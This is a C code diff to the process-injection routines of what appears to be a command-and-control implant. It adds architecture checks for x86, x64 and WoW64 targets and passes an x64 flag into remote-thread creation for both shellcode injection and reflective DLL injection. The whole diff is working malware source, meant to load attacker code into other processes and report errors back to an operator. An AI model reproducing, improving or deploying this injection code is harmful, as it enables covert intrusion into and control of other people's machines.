@@ -41,6 +41,7 @@ DWORD Inject(
     HANDLE Thread  = NULL;
     PVOID  Memory  = NULL;
     PVOID  Param   = NULL;
+    BOOL   IsWow64 = FALSE;
 
     /* check if required params have been specified */
     if ( ( ( ! Handle ) && ( ! Pid ) ) || ( ( ! Payload ) && ( ! Size ) ) ) {
@@ -63,16 +64,21 @@ DWORD Inject(
         PRINTF( "[INJECT] Using specified process handle: %x\n", Process )
     }
 
-    // TODO: if x86, check process is not x64?
-
-    /* check if the process is x64 */
-    if ( x64 ) {
-        if ( ProcessIsWow( Process ) ) {
-            PUTS( "The process target process is x86!" )
-            Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
-            goto END;
-        }
-        /* we good */
+    /* check the architecture matches */
+    if ( x64 && Instance.Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ) {
+        PUTS( "The OS is x86!" )
+        Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
+        goto END;
+    }
+    IsWow64 = ProcessIsWow( Process );
+    if ( x64 && IsWow64 ) {
+        PUTS( "The process target process is x86!" )
+        Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
+        goto END;
+    } else if ( ! x64 && Instance.Session.OS_Arch == PROCESSOR_ARCHITECTURE_AMD64 && ! IsWow64 ) {
+        PUTS( "The process target process is x64!" )
+        Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
+        goto END;
     }
 
     /* allocate memory in the remote process */
@@ -120,7 +126,7 @@ DWORD Inject(
     }
 
     /* create new thread in remote process */
-    if ( ( Thread = ThreadCreate( Method, Process, C_PTR( Memory + Offset ), Param, &Tid ) ) ) {
+    if ( ( Thread = ThreadCreate( Method, Process, x64, C_PTR( Memory + Offset ), Param, &Tid ) ) ) {
         Status = INJECT_ERROR_SUCCESS;
         PRINTF( "[INJECT] Successful injected code into remote process: [Tid: %d]\n", Tid );
     } else {
@@ -177,6 +183,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     BOOL     HasRDll             = FALSE;
     DWORD    ReturnValue         = 0;
     SIZE_T   BytesWritten        = 0;
+    BOOL     x64                 = Instance.Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ? FALSE : TRUE;
 
     if( ! DllBuffer || ! DllLength || ! hTargetProcess )
     {
@@ -187,6 +194,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
 
     if ( ProcessIsWow( hTargetProcess ) ) // check if remote process x86
     {
+        x64 = FALSE;
         if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X86 ) // check if dll is x64
         {
             PUTS( "[ERROR] trying to inject a x64 payload into a x86 process. ABORT" );
@@ -267,8 +275,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
                 ctx->Parameter = MemParamsBuffer;
                 PRINTF( "ctx->Parameter: %p\n", ctx->Parameter )
 
-                // if ( ! ThreadCreate( ctx->Technique, hTargetProcess, ReflectiveLdr, ctx ) )
-                if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, hTargetProcess, ReflectiveLdr, MemParamsBuffer, NULL ) )
+                if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, hTargetProcess, x64, ReflectiveLdr, MemParamsBuffer, NULL ) )
                 {
                     PRINTF( "[-] Failed to inject dll %d\n", NtGetLastError() )
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
